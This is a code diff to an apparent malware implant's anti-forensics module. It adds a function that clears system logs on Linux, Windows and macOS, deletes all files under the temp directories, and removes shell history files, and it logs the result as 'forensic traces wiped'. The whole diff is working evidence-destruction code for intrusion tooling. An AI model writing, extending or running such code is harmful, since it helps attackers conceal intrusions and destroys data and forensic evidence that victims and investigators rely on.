@@ -4,6 +4,8 @@ import threading
 import time
 import traceback
 import sqlite3
+import sys
+import shutil
 
 from pathlib import Path
 from modules.logger import log_event
@@ -61,6 +63,47 @@ def clear_macos_tcc():
         log_event("anti_forensics", b"Cleared macOS TCC and unified logs.")
     except Exception as e:
         log_event("anti_forensics", f"Error clearing macOS logs: {e}".encode())
+
+def wipe_all_traces():
+    """Wipe all forensic traces from the system"""
+    try:
+        # Clear all logs
+        clear_linux_logs()
+        clear_windows_logs()
+        clear_macos_tcc()
+        
+        # Clear temp files
+        temp_dirs = ["/tmp", "/var/tmp", os.path.expanduser("~/tmp")]
+        for temp_dir in temp_dirs:
+            if os.path.exists(temp_dir):
+                for file in os.listdir(temp_dir):
+                    try:
+                        file_path = os.path.join(temp_dir, file)
+                        if os.path.isfile(file_path):
+                            os.remove(file_path)
+                        elif os.path.isdir(file_path):
+                            shutil.rmtree(file_path)
+                    except Exception:
+                        pass
+        
+        # Clear shell history
+        shell_files = [
+            os.path.expanduser("~/.bash_history"),
+            os.path.expanduser("~/.zsh_history"),
+            os.path.expanduser("~/.fish_history")
+        ]
+        
+        for shell_file in shell_files:
+            if os.path.exists(shell_file):
+                try:
+                    os.remove(shell_file)
+                except Exception:
+                    pass
+        
+        log_event("anti_forensics", "All forensic traces wiped".encode())
+        
+    except Exception as e:
+        log_event("anti_forensics", f"Wipe traces error: {e}".encode())
 
 def anti_forensics_loop():
     while True:
